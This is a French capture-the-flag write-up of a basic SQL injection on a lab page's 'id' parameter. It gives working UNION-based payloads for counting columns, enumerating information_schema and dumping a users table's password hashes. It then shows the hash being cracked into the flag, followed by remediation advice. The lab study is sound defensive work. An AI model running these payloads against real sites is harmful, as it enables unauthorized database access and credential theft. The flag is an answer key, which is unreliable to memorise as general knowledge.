# SQL Injection Basic — `?page=member`

## Localisation
Page `?page=member` — paramètre `id` injecté directement dans une clause `WHERE` sans préparation.

## Identification
```
?page=member&id=submit&Submit=Submit
→ "Unknown column 'submit' in 'where clause'"
```
Confirmation : input non quoté inséré directement dans la requête SQL.

## Exploitation

**1. Nombre de colonnes**
```
?id=1 ORDER BY 3-- -   → erreur → 2 colonnes
```

**2. Mapping UNION**
```
?id=0 UNION SELECT 1,2-- -
→ First name: 1 - Surname: 2
```

**3. Énumération du schéma**
```
?id=0 UNION SELECT column_name,table_name FROM information_schema.columns WHERE table_schema=database()-- -
```
Colonnes identifiées dans `users` : `user_id`, `first_name`, `last_name`, `Commentaire`, **`countersign`**.

**4. Extraction**
```
?id=0 UNION SELECT countersign,Commentaire FROM users-- -
```
4e enregistrement :
> `5ff9d0165b4f92b14994e5c685cdce28`
> "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

**5. Crack et transformation**
```bash
# CrackStation : 5ff9d0165b... → FortyTwo
echo -n "fortytwo" | sha256sum
→ 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Flag
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Impact
- Dump complet de la base utilisateurs
- Lecture cross-database via `information_schema` (6 bases accessibles)
- RCE potentielle si `INTO OUTFILE` autorisé
- Authentification forgée par UNION bypass

## Fix
- Requêtes préparées PDO : `$stmt = $pdo->prepare("SELECT ... WHERE id = ?")`
- Cast strict : `intval($_GET['id'])`
- Désactiver `display_errors` en production
- bcrypt/argon2 pour stocker les mots de passe
- Principe du moindre privilège sur le compte MySQL

## Catégorie OWASP
`A03:2021 — Injection`